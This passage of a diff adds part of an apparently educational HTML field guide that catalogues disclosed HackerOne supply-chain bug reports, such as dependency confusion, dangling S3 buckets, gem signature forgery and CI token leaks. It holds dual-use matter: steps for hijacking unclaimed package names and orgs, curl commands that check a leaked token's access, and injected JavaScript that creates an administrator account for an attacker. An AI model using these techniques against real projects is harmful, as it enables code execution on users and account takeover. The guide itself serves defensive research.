+# -&gt; NoSuchBucket -&gt; create it and host rocket.chat-develop.tgz
+curl -fSL "https://s3.amazonaws.com/rocketchatbuild/rocket.chat-develop.tgz" -o rocket.chat.tgz &amp;&amp; tar zxf rocket.chat.tgz</div>
+<p class="insight"><b>Insight —</b> Grep install/build/CI scripts (install.sh, Dockerfile, Makefile, CI yaml) for fetches from S3 buckets, GCS, or package names, then test each host for claimability (dangling S3 bucket, unregistered npm/pypi name). A dangling bucket in a run-as-root installer is broad RCE - same class as subdomain takeover but for artifact hosts.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/399166" target="_blank" rel="noopener">hackerone.com/reports/399166</a></span><a class="src" href="#report-399166" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-275269" style="--sv:var(--sev-med)" data-sev="2" data-votes="16" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Gem signature forgery via verify-vs-install tar parser differential</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#275269</b> · rubygems · 1000 · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>rubygems</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">gem's extract_files reads the FIRST data.tar.gz tar entry while verify reads the LAST. A tar may contain duplicate-named entries, so an attacker prepends a malicious data.tar.gz (installed) while the genuine signed data.tar.gz (verified) is honored - passing even -P HighSecurity.</p>
+<h4>Method</h4><ol><li>Take a genuine signed gem</li><li>Prepend a second data.tar.gz entry with malicious contents (duplicate name)</li><li>verify honors the last (genuine, signed) entry; extract_files installs the first (malicious) entry</li><li>gem install -P HighSecurity succeeds and installs the forged payload</li></ol>
+<div class="pre"># tar with duplicate entries; forge-gem.sh technique
+tar tvf forged.gem  # two data.tar.gz entries: [malicious first] ... [genuine+sig last]</div>
+<p class="insight"><b>Insight —</b> A general signature-bypass class: whenever the code path that VERIFIES a signature and the path that USES the content parse the container differently (which duplicate entry wins?), forgery is possible. Test formats allowing duplicate names - tar, zip, multipart, JSON - for verify/consume disagreement.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/275269" target="_blank" rel="noopener">hackerone.com/reports/275269</a></span><a class="src" href="#report-275269" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-1130416" style="--sv:var(--sev-med)" data-sev="2" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Broken release integrity: published checksum is the empty-string hash</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1130416</b> · kubernetes · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>kubernetes</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Published SHA512 checksums for most Kubernetes release tarballs were wrong and identical across releases - the constant cf83e1357...da3e, which is SHA512 of empty input - so artifact integrity could not be verified and tampering would go undetected.</p>
+<h4>Method</h4><ol><li>Download a release artifact and its published checksum</li><li>Compute the real hash (sha512sum / openssl dgst -sha512)</li><li>Notice the published value is the empty-string hash constant and identical across versions</li></ol>
+<div class="pre"># SHA512 of empty input (a red flag if it appears as a published checksum):
+cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e</div>
+<p class="insight"><b>Insight —</b> Learn the hash-of-empty-string constants (SHA512 cf83e1357..., SHA256 e3b0c442...); seeing them in a checksum/signature field signals a broken integrity pipeline hashing nothing. Always verify published checksums actually match the artifact, not merely that a checksum is present.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1130416" target="_blank" rel="noopener">hackerone.com/reports/1130416</a></span><a class="src" href="#report-1130416" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-212067" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="100">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CI/CD token disclosure in public build logs (Travis CI)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#212067</b> · algolia · $100 · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>algolia</b></span><span>Surface <b>other</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A CI deploy step (gh-pages push) echoes the authenticated git remote URL to stdout, embedding the bot account's GitHub token in the public Travis CI job log; the token carries public_repo scope granting commit access.</p>
+<h4>Method</h4><ol><li>Enumerate the target's public CI (Travis/CircleCI/GitHub Actions) build logs</li><li>Grep logs for tokens in echoed git URLs / gh-pages deploy output (https://&lt;token&gt;@github.com/...)</li><li>Validate scope: GET https://api.github.com/user and /user/repos with the token</li></ol>
+<div class="pre">curl -H 'Authorization: token GHP_LEAKED' https://api.github.com/user
+curl -H 'Authorization: token GHP_LEAKED' https://api.github.com/user/repos</div>
+<p class="insight"><b>Insight —</b> Public CI job logs are a prime secret source: deploy scripts that print the authenticated remote (push to https://TOKEN@github.com) leak creds on every build. Check historical builds too - the leak recurs until the pipeline is fixed and the token rotated.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/212067" target="_blank" rel="noopener">hackerone.com/reports/212067</a></span><a class="src" href="#report-212067" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-186352" style="--sv:var(--sev-med)" data-sev="2" data-votes="8" data-bounty="300">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Install script fetches root-run binaries over HTTP w/o verification</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#186352</b> · phabricator · USD 300 · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>phabricator</b></span><span>Surface <b>other</b></span><span>Chain <b>MITM -&gt; tampered binary -&gt; RCE as root during install</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Official installation scripts download components (go-pear.phar, epel-release rpm) over plain http:// and execute/install them with sudo, with no checksum or GPG verification. An on-path (MITM) attacker or compromised mirror gains root code execution.</p>
+<h4>Method</h4><ol><li>Audit install/setup scripts for http:// (not https) download URLs</li><li>Flag any that pipe/exec/install the artifact with sudo/root and lack sha256 or GPG check</li><li>MITM the fetch (ARP/DNS/rogue mirror) and swap the payload -&gt; code runs as root</li></ol>
+<div class="pre"># from install_rhel-derivs.sh
+wget http://pear.php.net/go-pear.phar
+$SUDO php go-pear.phar &amp;&amp; $SUDO pecl install apc
+$SUDO rpm -Uvh http://download.fedoraproject.org/pub/epel/5/i386/epel-release-5-4.noarch.rpm</div>
+<p class="insight"><b>Insight —</b> grep install/bootstrap/Dockerfile/CI scripts for 'http://' + 'sudo|curl|wget|rpm|pip|npm'. Unverified root-privileged HTTP fetches are a reliable MITM/supply-chain RCE primitive.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/186352" target="_blank" rel="noopener">hackerone.com/reports/186352</a></span><a class="src" href="#report-186352" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-2271095" style="--sv:var(--sev-med)" data-sev="2" data-votes="49" data-bounty="2540">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>ASAR integrity bypass via filetype/directory confusion</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2271095</b> · ibb · USD 2540 · 49 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>desktop</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Electron's embeddedAsarIntegrityValidation validated an app.asar file, but a maliciously crafted DIRECTORY mirroring the ASAR structure was loaded as if it were the validated archive (filetype confusion), letting unvalidated code run (CVE-2023-44402, macOS).</p>
+<h4>Method</h4><ol><li>Target an Electron app on macOS with embeddedAsarIntegrityValidation + onlyLoadAppFromAsar fuses</li><li>Gain write access to the .app bundle (the fuses' threat model)</li><li>Replace app.asar with a directory named app.asar mirroring the structure</li><li>Electron loads the directory as app, skipping integrity validation</li></ol>
+<p class="insight"><b>Insight —</b> Integrity checks keyed on a single file/path can be bypassed if the loader also accepts a same-named directory (or symlink). When auditing 'signed/validated blob' loaders, test path/type confusion: directory vs file, symlink, case-insensitive FS collisions.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2271095" target="_blank" rel="noopener">hackerone.com/reports/2271095</a></span><a class="src" href="#report-2271095" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-1364851" style="--sv:var(--sev-low)" data-sev="1" data-votes="70" data-bounty="200">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>WordPress plugin dependency-confusion via unclaimed SVN slug</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1364851</b> · trafficfactory · 200 · 70 votes · resolved</div>
+<div class="taxo"><span>Program <b>trafficfactory</b></span><span>Surface <b>web</b></span><span>Chain <b>site compromise -&gt; backdoor/RCE via plugin update</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An internally developed WP plugin whose slug is not registered in the public plugin directory can be published there by an attacker; the site's auto-update then pulls the attacker's backdoored version.</p>
+<h4>Method</h4><ol><li>Passively fingerprint installed plugins from front-end JS/CSS asset paths (/wp-content/plugins/&lt;slug&gt;/)</li><li>Check plugins.svn.wordpress.org/&lt;slug&gt; - if 404, the slug is unclaimed</li><li>Submit a plugin under that slug (passes automated review: lowercase-alnum, non-reserved, non-trademarked, &lt;100 installs)</li><li>Publish, then bump version with a backdoor; victim's update notification pulls it -&gt; RCE</li></ol>
+<div class="pre">https://site/wp-content/plugins/tf-elementor/... (installed)
+https://plugins.svn.wordpress.org/tf-elementor -&gt; 404 (claimable)</div>
+<p class="insight"><b>Insight —</b> Confused-deputy/dependency-confusion applies to WP plugins/themes: any internal slug missing from the public SVN registry is hijackable and weaponized through the trusted update channel.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1364851" target="_blank" rel="noopener">hackerone.com/reports/1364851</a></span><a class="src" href="#report-1364851" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-462503" style="--sv:var(--sev-low)" data-sev="1" data-votes="26" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Dependency confusion via auto-linked package name to a public registry</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#462503</b> · gitlab · USD 1000 · 26 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span><span>Chain <b>claim unpublished name -&gt; victim installs -&gt; npm lifec</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The platform auto-links a repo's package.json name to the public npm registry even when the package was never published (local-only); an attacker registers the unpublished name on npm so the trusted project page links users to the attacker's malicious module.</p>
+<h4>Method</h4><ol><li>Find a project whose package.json name has no homepage pointing to a private registry and is unpublished on npm</li><li>Publish an npm package under that exact name with malicious install scripts</li><li>The project's file view now hyperlinks the package name to your npm module</li><li>Victims following the trusted link install code that runs npm lifecycle scripts</li></ol>
+<div class="pre"># publish a package claiming the unpublished name
+npm publish   # package.json { "name": "gitter-desktop", ... , scripts.preinstall = payload }</div>
+<p class="insight"><b>Insight —</b> Auto-linking a manifest package name to a public registry, without proving the package is actually published there by the owner, is dependency confusion by construction. Enumerate manifest names that are unclaimed on the public registry and claim them.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/462503" target="_blank" rel="noopener">hackerone.com/reports/462503</a></span><a class="src" href="#report-462503" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-1439355" style="--sv:var(--sev-low)" data-sev="1" data-votes="16" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Renamed GitHub org handle re-registered to hijack a CI action</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1439355</b> · shopify · awarded · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A CI workflow pins a base action to an external GitHub org that was renamed; GitHub redirects the old handle only until someone re-registers it, after which the old name serves the attacker's repo and runs attacker code in CI with access to secrets.GITHUB_TOKEN and org secrets.</p>
+<h4>Method</h4><ol><li>Find a workflow 'uses:' an external action (e.g. build.yml)</li><li>Visit the org and observe a redirect to a renamed org - the old handle is now free</li><li>Register the old org/handle; subsequent PRs/pipelines run the attacker's action and leak CI secrets</li></ol>
+<div class="pre"># .github/workflows/build.yml
+uses: MirrorNG/unity-runner   # old renamed org name is re-registrable -&gt; attacker controls the action</div>
+<p class="insight"><b>Insight —</b> Renamed GitHub orgs leave the previous handle re-registrable while redirects mask it. Any workflow referencing the old name (uses:) is a supply-chain RCE with token/secret access. Defense: pin actions to a full commit SHA, not a mutable org/tag.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1439355" target="_blank" rel="noopener">hackerone.com/reports/1439355</a></span><a class="src" href="#report-1439355" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-1434967" style="--sv:var(--sev-low)" data-sev="1" data-votes="16" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Dangling GitHub account referenced by official docs -&gt; supply-chain takeover</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1434967</b> · kubernetes · awarded · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>kubernetes</b></span><span>Surface <b>web</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Official docs link to an external GitHub org/account (a driver in the CSI drivers list) that was never registered; anyone can register it and host malicious driver code that users are instructed to install.</p>
+<h4>Method</h4><ol><li>Crawl docs/README links for external GitHub orgs/repos</li><li>Find one whose org/account 404s / is unregistered</li><li>Register the account and host a PoC repo at the referenced path</li></ol>
+<p class="insight"><b>Insight —</b> Enumerate every GitHub org/repo referenced by a target's docs, READMEs and package manifests; claim any that resolve to an unregistered account. Downstream users following the docs then pull attacker code (potential RCE).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1434967" target="_blank" rel="noopener">hackerone.com/reports/1434967</a></span><a class="src" href="#report-1434967" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-2377760" style="--sv:var(--sev-none)" data-sev="0" data-votes="11" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Subresource Integrity check silently skipped on malformed hash</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#2377760</b> · nodejs · none · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>other</b></span><span>Chain <b>SRI bypass -&gt; load tampered dependency/resource (supply-c</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">undici's parseHashWithOptions failed to match base64url-encoded hashes and any algorithm with an invalid hash value (e.g. 'sha256--'), so bytesMatch treated the resource as having no applicable integrity metadata and loaded it without verification.</p>
+<h4>Method</h4><ol><li>Supply fetch() with an integrity option using base64url or a malformed hash (sha256--)</li><li>parseHashWithOptions fails to recognize the algorithm, returns no valid entries</li><li>bytesMatch sees no hashes to compare and returns true -&gt; SRI is bypassed</li><li>Attacker-modified resource loads despite the integrity attribute</li></ol>
+<div class="pre">// integrity that should FAIL but is silently skipped:
+fetch(url, { integrity: 'sha256--' })            // invalid value -&gt; no check
+fetch(url, { integrity: 'sha256-&lt;base64url&gt;' })   // base64url not parsed -&gt; no check
+// vuln: undici lib/fetch/util.js parseHashWithOptions</div>
+<p class="insight"><b>Insight —</b> Integrity/verification code that returns 'match' when it cannot parse the expected value is fail-open. When auditing SRI/signature checks, feed malformed and alternate-encoding (base64 vs base64url) values and confirm the check FAILS closed. CVE-2024-30261.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2377760" target="_blank" rel="noopener">hackerone.com/reports/2377760</a></span><a class="src" href="#report-2377760" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-136531" style="--sv:var(--sev-none)" data-sev="0" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cross-origin script inclusion: compromise a low-trust site to hijack a high-trust app</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#136531</b> · uber · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>uber</b></span><span>Surface <b>web</b></span><span>Chain <b>WordPress webroot write → modify cross-included adrum.js → a</b></span><span>Tag <b>supply-chain</b></span><span>Tag <b>account-takoever</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An internal Confluence (team.uberinternal.com) loaded a JS file (adrum.js) hosted on a separately-managed, lower-security WordPress site (newsroom.uber.com); compromising the WordPress site lets the attacker modify that script and execute arbitrary JS in authenticated Confluence users' browsers, including admin-creation requests.</p>
+<h4>Method</h4><ol><li>Map which high-value app pages include &lt;script src&gt; from a different, weaker host</li><li>Compromise or gain file-write on the weaker host (WordPress webroot here)</li><li>Replace the referenced JS with a payload that performs authenticated same-origin actions (CSRF token read + admin user creation) on every page load</li><li>Wait for an admin to be logged in / enter the privileged area so secondary password-gated actions succeed</li></ol>
+<div class="pre">// injected into adrum.js, runs on Confluence origin:
+(function(){
+ var token=AJS.Meta.get('atl-token');
+ var x=new XMLHttpRequest();
+ x.open('POST','/admin/users/docreateuser.action');
+ x.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+ x.send('atl_token='+token+'&amp;username=attacker&amp;fullName=foo&amp;email=new@attacker.com&amp;password=new&amp;confirm=new');
+})();</div>
+<p class="insight"><b>Insight —</b> Third-party/self-hosted script includes erase trust boundaries: a 'low risk' marketing-site bug becomes RCE-on-users of an internal app. When triaging XSS/compromise on a minor asset, grep target apps for &lt;script src&gt; pointing at it. The included-from origin inherits the includer's DOM and cookies.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/136531" target="_blank" rel="noopener">hackerone.com/reports/136531</a></span><a class="src" href="#report-136531" style="color:var(--faint)">#</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (7 of 31 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>No dedicated PortSwigger lab for this class; use the methodology above and the cited reports.</li>
+<li>All 31 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#technique-variants">Technique variants</a><a href="#dependency-confusion" style="padding-left:24px">↳ Dependency confusion</a><a href="#insecure-build-fetch-http-no-integrity" style="padding-left:24px">↳ Insecure build fetch (HTTP / no integrity)</a><a href="#pull-request-target-ci-rce" style="padding-left:24px">↳ pull_request_target CI RCE</a><a href="#dangling-artifact-host-takeover" style="padding-left:24px">↳ Dangling artifact host takeover</a><a href="#trust-gate-automation-service-discovery" style="padding-left:24px">↳ Trust-gate automation &amp; service discovery</a><a href="#backdoored-typosquatted-packages" style="padding-left:24px">↳ Backdoored &amp; typosquatted packages</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (31)</a><a href="#refs">References</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
